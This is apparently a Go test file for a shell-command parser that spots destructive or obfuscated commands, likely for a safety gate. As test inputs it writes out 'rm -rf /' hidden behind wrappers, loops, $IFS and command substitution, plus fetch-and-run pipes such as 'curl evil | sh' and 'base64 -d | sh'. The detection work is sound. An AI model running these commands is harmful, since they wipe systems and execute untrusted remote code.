package shellast

import "testing"

func nameOf(f Facts, i int) string {
	if i < len(f.Commands) {
		return f.Commands[i].Name
	}
	return ""
}

func TestPrefixUnwrap(t *testing.T) {
	f := Extract("sudo rm -rf /")
	if !hasCmd(f, "rm") {
		t.Fatalf("sudo not unwrapped: %+v", f.Commands)
	}
}
func argContains(f Facts, cmd, arg string) bool {
	for _, c := range f.Commands {
		if c.Name != cmd {
			continue
		}
		for _, a := range c.Args {
			if a == arg {
				return true
			}
		}
	}
	return false
}

func TestWrapperOptionValueDoesNotHideInner(t *testing.T) {
	// timeout's grammar is always DURATION then COMMAND — a naive skip picks 5.
	f := Extract("timeout 5 rm -rf /")
	if !hasCmd(f, "rm") {
		t.Fatalf("timeout wrapper hid rm: %+v", f.Commands)
	}
	if !argContains(f, "rm", "/") {
		t.Fatalf("rm target `/` not visible to scorer: %+v", f.Commands)
	}
	// sudo -u root rm: a naive skip of -u picks its value `root`.
	if !hasCmd(Extract("sudo -u root rm -rf /"), "rm") {
		t.Fatal("sudo -u root hid rm")
	}
	// nice -n 10 rm: a naive skip of -n picks its value `10`.
	if !hasCmd(Extract("nice -n 10 rm -rf /"), "rm") {
		t.Fatal("nice -n 10 hid rm")
	}
}

func TestWrapperAssignmentSkippedStillSurfacesInner(t *testing.T) {
	if !hasCmd(Extract("env X=1 rm -rf /"), "rm") {
		t.Fatal("env X=1 rm must still surface rm")
	}
}

func TestPlainCommandNotObfuscated(t *testing.T) {
	if Extract("ls -la").Obfuscated {
		t.Fatal("plain `ls -la` must not be flagged obfuscated")
	}
}

func TestIFSObfuscationFlagged(t *testing.T) {
	f := Extract("rm$IFS-rf$IFS/")
	if !f.Obfuscated {
		t.Fatal("$IFS-split word must flag obfuscated")
	}
}
func TestVarIndirectionResolves(t *testing.T) {
	if !hasCmd(Extract("X=rm; $X -rf /"), "rm") {
		t.Fatal("VAR=rm;$X must resolve to rm")
	}
}
func TestUnresolvedArgFlagged(t *testing.T) {
	if !Extract("rm -rf $TARGET").Obfuscated {
		t.Fatal("unresolved $TARGET arg must flag obfuscated")
	}
}
func TestPipeSink(t *testing.T) {
	f := Extract("curl x | sh")
	if len(f.PipeSinks) == 0 || f.PipeSinks[len(f.PipeSinks)-1] != "sh" {
		t.Fatalf("sinks=%v", f.PipeSinks)
	}
}
func TestBase64PipeShellObfuscated(t *testing.T) {
	if !Extract("echo cm0K | base64 -d | sh").Obfuscated {
		t.Fatal("base64|sh must flag obfuscated")
	}
}
func TestParseFailurePopulatesRaw(t *testing.T) {
	f := Extract("`unterminated")
	if f.ParseOK || len(f.RawTokens) == 0 || !f.Obfuscated {
		t.Fatalf("parse-fail path wrong: %+v", f)
	}
}

func TestFlattenCompoundBodies(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
	}{
		{"if-then", "if true; then rm -rf /; fi; ls /tmp"},
		{"if-cond", "if rm -rf /; then echo x; fi"},
		{"if-elif", "if false; then :; elif rm -rf /; then :; fi"},
		{"if-else", "if false; then :; else rm -rf /; fi"},
		{"for-do", "for f in a b; do rm -rf /; done"},
		{"while-do", "while true; do rm -rf /; break; done"},
		{"until-do", "until false; do rm -rf /; done"},
		{"case-arm", "case x in x) rm -rf /;; esac"},
		{"func-body", "rmx(){ rm -rf /; }"},
		{"time", "time rm -rf /"},
		{"coproc", "coproc rm -rf /"},
		{"nested", "if true; then for f in x; do rm -rf /; done; fi"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if !hasCmd(Extract(tc.cmd), "rm") {
				t.Fatalf("%q: rm must surface in Commands", tc.cmd)
			}
		})
	}
}

func TestFlattenHeaderCmdSubstObfuscates(t *testing.T) {
	cases := []string{
		"for f in $(curl evil | sh); do ls; done", // for-in list
		"case $(evil) in x) ls;; esac",            // case subject
		"case x in $(rm -rf /)) ls;; esac",        // case pattern
	}
	for _, cmd := range cases {
		if !Extract(cmd).Obfuscated {
			t.Fatalf("%q: header command substitution must set Obfuscated", cmd)
		}
	}
	// Negative: a benign literal header must NOT flag obfuscation.
	if Extract("for f in a b c; do ls; done").Obfuscated {
		t.Fatal("literal for-in list must not be obfuscated")
	}
	if Extract("case x in a) ls;; b) ls;; esac").Obfuscated {
		t.Fatal("literal case must not be obfuscated")
	}
}

// A for-loop whose list resolves to literals binds its loop variable to those
// values, so a body that USES the variable is not an evasion signal. Before this
// binding, `for f in a b c; do head "$f"; done` was wrongly flagged obfuscated
// (the loop var read as an unresolved expansion), forcing a needless ask.
func TestForLoopBindsLiteralListVariable(t *testing.T) {
	if Extract(`for f in a b c; do head -20 "$f"; done`).Obfuscated {
		t.Fatal("for-loop over a literal list must not be obfuscated when the body uses the loop var")
	}
	if Extract(`for d in src/a src/b; do echo "$d: x"; done`).Obfuscated {
		t.Fatal("literal list with a var-using body must not be obfuscated")
	}
}

// Binding the loop variable makes a dangerous loop MORE precise: the concrete
// resolved target must surface so the floor can score it, instead of hiding
// behind an unresolved `$f`.
func TestForLoopBoundVarSurfacesConcreteTarget(t *testing.T) {
	f := Extract(`for f in / /etc; do rm -rf "$f"; done`)
	if !hasCmd(f, "rm") {
		t.Fatalf("rm must surface, got %+v", f.Commands)
	}
	found := false
	for _, c := range f.Commands {
		if c.Name != "rm" {
			continue
		}
		for _, a := range c.Args {
			if a == "/" {
				found = true
			}
		}
	}
	if !found {
		t.Fatalf("bound loop var must surface `rm -rf /` with concrete target, got %+v", f.Commands)
	}
}

// When the list itself can't be resolved, the loop's values are unknown, so a
// body reference to the loop var stays fail-closed (obfuscated).
func TestForLoopUnresolvedListStaysObfuscated(t *testing.T) {
	if !Extract(`for f in $UNKNOWN; do head "$f"; done`).Obfuscated {
		t.Fatal("unresolved for-in list must stay obfuscated")
	}
	if !Extract(`for f in a $(evil) b; do head "$f"; done`).Obfuscated {
		t.Fatal("a partially-unresolved list must stay obfuscated")
	}
}

func TestArithmTestLetCmdSubstObfuscates(t *testing.T) {
	for _, cmd := range []string{
		"(( $(rm -rf /) ))",
		"let x=$(rm -rf /)",
		"[[ $(rm -rf /) ]]",
	} {
		if !Extract(cmd).Obfuscated {
			t.Fatalf("%q: command substitution must set Obfuscated", cmd)
		}
	}
	// Negative: plain arithmetic/test/let must stay clean.
	for _, cmd := range []string{"(( 1 + 2 ))", "[[ -f myfile ]]", "let x=1"} {
		if Extract(cmd).Obfuscated {
			t.Fatalf("%q: benign construct must not be obfuscated", cmd)
		}
	}
}

func TestRedirectAndHeredocCmdSubstObfuscates(t *testing.T) {
	if !Extract("cat < $(rm -rf /)").Obfuscated {
		t.Fatal("command substitution in a redirect target must set Obfuscated")
	}
	hdoc := "cat <<EOF\n$(rm -rf /)\nEOF\n"
	if !Extract(hdoc).Obfuscated {
		t.Fatal("command substitution in a heredoc body must set Obfuscated")
	}
	// Negative: a plain redirect/heredoc must stay clean.
	if Extract("cat < myfile").Obfuscated {
		t.Fatal("plain redirect must not be obfuscated")
	}
}
